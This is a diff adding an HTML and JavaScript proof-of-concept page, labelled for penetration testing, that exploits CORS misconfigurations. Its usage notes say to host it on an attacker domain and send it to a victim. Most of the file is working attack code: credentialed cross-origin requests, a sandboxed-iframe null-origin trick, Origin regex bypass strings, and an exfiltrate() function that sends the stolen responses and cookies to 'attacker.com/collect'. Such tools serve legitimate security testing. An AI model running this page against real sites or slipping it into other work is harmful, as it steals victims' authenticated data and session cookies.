@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS Misconfiguration PoC</title>
+<!--
+  CORS Misconfiguration PoC — VAPT
+
+  Usage:
+  1. Replace TARGET_URL with the vulnerable endpoint
+  2. Host this file on your attacker-controlled domain
+  3. Send the link to the victim (or open in victim's authenticated browser)
+  4. If CORS is misconfigured, the response data is exfiltrated
+
+  Common CORS misconfigurations:
+  - Access-Control-Allow-Origin: * (with credentials)
+  - Access-Control-Allow-Origin reflects arbitrary Origin
+  - Access-Control-Allow-Origin trusts null origin
+  - Regex bypass (e.g., evil.com.attacker.com matches *.evil.com)
+-->
+<style>
+  body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
+  pre { background: #000; padding: 15px; border: 1px solid #333; overflow-x: auto; }
+  h2 { color: #ff0; }
+  .error { color: #f00; }
+  .success { color: #0f0; }
+  button { background: #333; color: #0f0; border: 1px solid #0f0; padding: 8px 16px; cursor: pointer; margin: 5px; }
+  button:hover { background: #0f0; color: #000; }
+  input { background: #000; color: #0f0; border: 1px solid #333; padding: 8px; width: 400px; }
+</style>
+</head>
+<body>
+
+<h2>CORS Misconfiguration PoC</h2>
+
+<p>Target URL: <input id="targetUrl" value="https://vulnerable-site.com/api/user/profile" /></p>
+<button onclick="testReflectedOrigin()">Test: Reflected Origin</button>
+<button onclick="testNullOrigin()">Test: null Origin</button>
+<button onclick="testWildcard()">Test: Wildcard</button>
+<button onclick="testSubdomain()">Test: Subdomain Trust</button>
+
+<h3>Results:</h3>
+<pre id="output">Click a test to begin...</pre>
+
+<h3>Exfiltrated Data:</h3>
+<pre id="data">Waiting...</pre>
+
+<script>
+var output = document.getElementById('output');
+var dataBox = document.getElementById('data');
+
+function log(msg, cls) {
+    output.innerHTML += '<span class="' + (cls || '') + '">' + msg + '</span>\n';
+}
+
+function clearLog() {
+    output.innerHTML = '';
+    dataBox.innerHTML = '';
+}
+
+// Test 1: Reflected Origin — most common misconfiguration
+function testReflectedOrigin() {
+    clearLog();
+    var url = document.getElementById('targetUrl').value;
+    log('[*] Testing reflected Origin on: ' + url);
+    log('[*] Sending request with credentials...');
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.withCredentials = true;
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            var acao = xhr.getResponseHeader('Access-Control-Allow-Origin');
+            var acac = xhr.getResponseHeader('Access-Control-Allow-Credentials');
+
+            log('\n[*] Response headers:');
+            log('  Access-Control-Allow-Origin: ' + (acao || 'not set'));
+            log('  Access-Control-Allow-Credentials: ' + (acac || 'not set'));
+
+            if (xhr.status === 200 && xhr.responseText) {
+                log('\n[+] VULNERABLE — Origin reflected with data access!', 'success');
+                dataBox.textContent = xhr.responseText;
+                exfiltrate(xhr.responseText);
+            } else if (acao === window.location.origin) {
+                log('\n[+] Origin reflected but no data (CORS pre-flight may block)', 'success');
+            } else {
+                log('\n[-] Not vulnerable to reflected Origin', 'error');
+            }
+        }
+    };
+    xhr.onerror = function() {
+        log('\n[-] Request blocked by CORS policy (not vulnerable)', 'error');
+    };
+    xhr.send();
+}
+
+// Test 2: null Origin (sandbox iframe / data URI)
+function testNullOrigin() {
+    clearLog();
+    var url = document.getElementById('targetUrl').value;
+    log('[*] Testing null Origin via sandboxed iframe');
+    log('[*] If vulnerable, data appears below...');
+
+    var iframe = document.createElement('iframe');
+    iframe.sandbox = 'allow-scripts';
+    iframe.style.display = 'none';
+    iframe.srcdoc = '<script>' +
+        'var xhr = new XMLHttpRequest();' +
+        'xhr.open("GET", "' + url + '", true);' +
+        'xhr.withCredentials = true;' +
+        'xhr.onload = function() {' +
+        '  parent.postMessage({type: "cors_result", data: xhr.responseText, status: xhr.status}, "*");' +
+        '};' +
+        'xhr.onerror = function() {' +
+        '  parent.postMessage({type: "cors_error"}, "*");' +
+        '};' +
+        'xhr.send();' +
+        '<\/script>';
+
+    window.addEventListener('message', function handler(e) {
+        if (e.data && e.data.type === 'cors_result') {
+            log('\n[+] VULNERABLE — null Origin accepted!', 'success');
+            log('[+] Status: ' + e.data.status);
+            dataBox.textContent = e.data.data;
+            exfiltrate(e.data.data);
+            window.removeEventListener('message', handler);
+        } else if (e.data && e.data.type === 'cors_error') {
+            log('\n[-] null Origin not accepted', 'error');
+            window.removeEventListener('message', handler);
+        }
+    });
+
+    document.body.appendChild(iframe);
+    setTimeout(function() { iframe.remove(); }, 10000);
+}
+
+// Test 3: Wildcard with credentials
+function testWildcard() {
+    clearLog();
+    var url = document.getElementById('targetUrl').value;
+    log('[*] Testing wildcard ACAO with credentials...');
+
+    fetch(url, { credentials: 'include' })
+        .then(function(resp) {
+            var acao = resp.headers.get('Access-Control-Allow-Origin');
+            log('[*] ACAO: ' + (acao || 'not set'));
+            if (acao === '*') {
+                log('\n[!] ACAO is * — credentials will NOT be sent by browser', 'error');
+                log('[!] Still a finding: sensitive data may leak without auth');
+                return resp.text();
+            }
+            return resp.text();
+        })
+        .then(function(text) {
+            if (text) dataBox.textContent = text;
+        })
+        .catch(function() {
+            log('\n[-] Request blocked', 'error');
+        });
+}
+
+// Test 4: Subdomain trust bypass
+function testSubdomain() {
+    clearLog();
+    var url = document.getElementById('targetUrl').value;
+    log('[*] To test subdomain trust:');
+    log('[*] 1. Find XSS on any subdomain of the target');
+    log('[*] 2. Use that XSS to make a credentialed request');
+    log('[*] Example: if target trusts *.example.com');
+    log('[*]   Find XSS on blog.example.com');
+    log('[*]   Inject: <script src=//attacker/cors-steal.js></script>');
+    log('\n[*] Common regex bypasses to try:');
+    log('  Origin: https://evil-example.com');
+    log('  Origin: https://example.com.evil.com');
+    log('  Origin: https://exampleXcom.evil.com');
+    log('  Origin: https://example.com%60.evil.com');
+    log('  Origin: https://example.com%0d%0a.evil.com');
+}
+
+// Exfiltrate stolen data to attacker server
+function exfiltrate(data) {
+    // Replace with your Burp Collaborator / webhook.site / ngrok URL
+    var exfil_url = 'https://attacker.com/collect';
+    log('\n[*] Exfiltrating to: ' + exfil_url);
+    try {
+        navigator.sendBeacon(exfil_url, JSON.stringify({
+            url: document.getElementById('targetUrl').value,
+            stolen: data,
+            cookies: document.cookie
+        }));
+        log('[+] Data sent!', 'success');
+    } catch(e) {
+        log('[!] sendBeacon failed, trying img tag');
+        new Image().src = exfil_url + '?d=' + encodeURIComponent(btoa(data));
+    }
+}
+</script>
+
+</body>
+</html>
